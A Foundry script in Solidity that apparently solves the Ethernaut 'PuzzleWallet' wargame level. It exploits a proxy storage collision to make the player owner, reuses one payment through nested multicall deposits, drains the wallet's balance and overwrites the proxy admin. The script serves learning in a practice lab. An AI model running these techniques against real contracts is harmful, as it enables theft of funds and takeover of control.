// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
pragma experimental ABIEncoderV2;

import "forge-std/console.sol";
import "forge-std/Script.sol";
import "../src/PuzzleWallet.sol";
contract PuzzleWalletSolution is Script {
    PuzzleWallet wallet = PuzzleWallet(payable(0x01Efef59571c70cC79524243CdF10Ba6B167b0D4));
    PuzzleProxy proxy = PuzzleProxy(payable(0x01Efef59571c70cC79524243CdF10Ba6B167b0D4));
    address player = 0xeDc3e3588a5F0bf61c9A6B4ad1e573942d729e16;
    uint256 amount = 1000000000000000; 

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        proxy.proposeNewAdmin(player);
        wallet.addToWhitelist(player);

        bytes[] memory arr = new bytes[](2);
        bytes[] memory subarr = new bytes[](1);
        subarr[0] = abi.encodeWithSignature("deposit()"); 
        arr[0] = abi.encodeWithSignature("multicall(bytes[])",subarr); 
        arr[1] = abi.encodeWithSignature("multicall(bytes[])",subarr); 

        // Call 2 deposit with 1 msg.value sent
        wallet.multicall{value: amount}(arr);
        
        // Drain address(wallet).balance
        wallet.execute(player, amount * 2, "");

        // Change maxBalance leads to admin changed
        wallet.setMaxBalance(uint256(uint160(player)));
        console.log(proxy.admin());
        vm.stopBroadcast();
    }
}